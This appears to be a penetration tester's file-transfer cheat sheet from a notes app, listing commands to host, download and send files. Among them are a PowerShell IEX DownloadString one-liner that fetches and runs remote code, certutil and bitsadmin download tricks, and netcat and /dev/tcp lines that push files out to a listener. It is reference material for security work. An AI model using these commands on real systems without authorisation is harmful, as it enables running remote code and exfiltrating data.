# File transfer: Overview
- - - -
## Host files
### SimpleHTTPServer
start http server in current dir
`python -m SimpleHTTPServer <port>`

### apache
start apache
`sudo systemctl start apache2`

default directory
`/var/www/html`

### SMB
smbserver.py (impacket)
`sudo impacket-smbserver <share-name> <local-folder>`

### FTP
[pure-ftpd](bear://x-callback-url/open-note?id=B518712B-3359-44F3-B0D3-9EA6BE22181F-3875-0000070802BBB6A3)
[TFTP](bear://x-callback-url/open-note?id=51A2CFAD-55E6-48D9-80EE-2C276B6E984B-3875-000007462EC1E7F0)

- - - -
## Download files
### wget
`wget <ip>:<port>/file.txt`
[more options](bear://x-callback-url/open-note?id=C8D9FB8D-F71D-4DDA-91BD-ACD1D9E81B8D-3875-000006E03E84135C)

### curl
`curl -O http://host/file.txt`

### PowerShell
`powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://www.xyz.net/file.txt', 'C:\tmp\file.txt')"`
`powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<host>/<file>')"`

### certutil
`certutil.exe -urlcache -split -f http://<host>/<file> <file>`

### VBScript
[wget clone](bear://x-callback-url/open-note?id=28725C72-DE77-4991-808F-B86F7981C4DD-3875-000006B7EDA0811B)

### BITSAdmin
`bitsadmin /transfer mydownloadjob /download /priority normal <url> <destination>`

### FTP
[pure-ftpd](bear://x-callback-url/open-note?id=B518712B-3359-44F3-B0D3-9EA6BE22181F-3875-0000070802BBB6A3)
[TFTP](bear://x-callback-url/open-note?id=51A2CFAD-55E6-48D9-80EE-2C276B6E984B-3875-000007462EC1E7F0)

- - - -
## Send/retrieve files
### netcat
`nc -nlvp <port> > file`
`nc -nv <own-ip> <port> < file`
Note: There is no feedback about the progress, or when/if the upload finished.

### cat
`cat <file> > /dev/tcp/<ip>/<port>`
`nc -lvnp <port> > <file>`

### FTP
[pure-ftpd](bear://x-callback-url/open-note?id=B518712B-3359-44F3-B0D3-9EA6BE22181F-3875-0000070802BBB6A3)
[TFTP](bear://x-callback-url/open-note?id=51A2CFAD-55E6-48D9-80EE-2C276B6E984B-3875-000007462EC1E7F0)

- - - -